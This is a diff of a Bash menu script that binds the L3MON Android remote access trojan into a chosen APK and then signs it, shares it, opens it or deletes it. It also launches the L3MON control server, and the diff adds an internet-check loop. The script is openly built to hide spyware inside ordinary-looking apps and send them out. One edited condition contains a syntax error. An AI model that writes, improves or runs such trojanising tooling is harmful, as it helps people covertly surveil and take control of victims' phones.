@@ -1,14 +1,42 @@
 #!/bin/bash
+#<<<------inertnet verification------>>>
+function __internet_() {
+while true; do
+ping -c 1 google.com > /dev/null 2>&1
+if [[ "$?" != 0 ]]
+then
+	echo
+        printf "\n[\e[1;31mERROR!!\e[0m]\e[1;31m YOU ARE NOT CONNECTED TO INTERNET!!\e[0m\n"
+        printf "\n\e[1;33mplease turn on your internet data to continue this process..\e[0m\n"
+	printf "\n\e[1;36mpress \e[1;31mEnter\e[1;36m if you have connected or run \e[1;31mquit\e[1;36m to exit==> \e[0m"
+	read internt
+	if [[ $internt == 'exit' || $internt == 'quit' ]]; then
+		printf "\e[4;97mCSF \e[0;0;0m> \e[1;32mExiting\e[0m"
+		printf "\e[1;32m..........\e[0m\n" | pv -qL 10
+		exit
+	else
+		:
+	fi
+else
+        printf "\n\e[4;97mCSF \e[0;0;0m> \e[1;32m connecting to server\e[0m"
+        printf "\e[1;32m...........\e[0m\n" | pv -qL 10
+	echo
+break
+fi
+done
+}
+#<<<----------PROGRAM---------->>>
 echo
 PWD=$(pwd)
 printf "\e[\e[1;34;40m In order to bind lemon rat in your desired apk file you must have created a lemon rat previously\e[0m\n"
 printf "\e[4;97mCSF \e[0;0;0m> \e[1;96;40m IF YOU HAVE ALREADY CREATED A LEMON RAT THEN PRESS ENTER TO CONTINUE ELSE PRESS 'y' to start the server of lemon\e[0m__"
 read choice
-if [[ $choice == y ]]
+if [[ $choice == 'y' || $choice == 'Y']]
 then
 echo
 printf "\e[1;97;40m SERVER OF LEMON (url:- http://localhost:22533/) IS STARTING ....\e[0m\n"
 printf "\e[1;31m please reload the page when it opens in your browser\e[0m"
+__internet_
 sleep 2
 xdg-open http://localhost:22533/
 lemon
@@ -53,29 +81,29 @@ do
 printf "\e[1;36m Enter your option==> \e[0m"
 read uopt
 echo
-if [[ $uopt == 1 ]] || [[ $uopt == 01 ]]
+if [[ $uopt == '1' ]] || [[ $uopt == '01' ]]
 then
 printf "\e[1;97;40m In order to sign your binded apk file download the apk signer app from playstore (link:- https://play.google.com/store/apps/details?id=com.haibison.apksigner ) and save the signed apk with name 'L3MON_binded.signed.apk' at same place where your unsigned binded apk file was saved!!\e[0m\n"
 echo
 printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m press enter key after you have signed the apk or run 'quit' to EXIT the program\e[0m__"
 read hung
-if [[ $hung == quit ]]
+if [[ $hung == 'quit' || $hung == 'exit' ]]
 then
 exit
 else
 printf "\e[1;97m Continuing .......\e[0m\n"
 fi
-elif [[ $uopt == 2 ]] || [[ $uopt == 02 ]]
+elif [[ $uopt == '2' ]] || [[ $uopt == '02' ]]
 then
 cd $HOME && cd /sdcard
 xdg-open --send L3MON_binded.signed.apk
 cd $PWD
-elif [[ $uopt == 3 ]] || [[ $uopt == 03 ]]
+elif [[ $uopt == '3' ]] || [[ $uopt == '03' ]]
 then
 cd $HOME && cd /sdcard
 xdg-open L3MON_binded.signed.apk
 cd $PWD
-elif [[ $uopt == 4 ]] || [[ $uopt == 04 ]]
+elif [[ $uopt == '4' ]] || [[ $uopt == '04' ]]
 then
 cd $HOME && cd /sdcard
 seek=$(find L3MON_binded.apk)
@@ -87,7 +115,7 @@ printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.apk is removed from your de
 else
 printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.apk is either deleted previously or not found!!\e[0m\n"
 fi
-elif [[ $uopt == 5 ]] || [[ $uopt == 05 ]]
+elif [[ $uopt == '5' ]] || [[ $uopt == '05' ]]
 then
 cd $HOME && cd /sdcard
 siik=$(find L3MON_binded.signed.apk)
@@ -99,16 +127,17 @@ printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.signed.apk is removed from 
 else
 printf "\e[4;97mCSF \e[0;0;0m> \e[1;31m L3MON_binded.signed.apk is either deleted previously or not found!!\e[0m\n"
 fi
-elif [[ $uopt == 6 ]] || [[ $uopt == 06 ]]
+elif [[ $uopt == '6' ]] || [[ $uopt == '06' ]]
 then
 printf "\e[1;97;40m SERVER OF L3MON (url:- http://localhost:22533/)  IS STARTING ....\e[0m\n"
 printf "\e[1;31m please reload the page when it opens in your browser\e[0m"
+__internet_
 sleep 2
 echo
 echo
 xdg-open http://localhost:22533/
 lemon
-elif [[ $uopt == quit ]]
+elif [[ $uopt == 'quit' || $uopt == 'exit' ]]
 then
 exit
 else
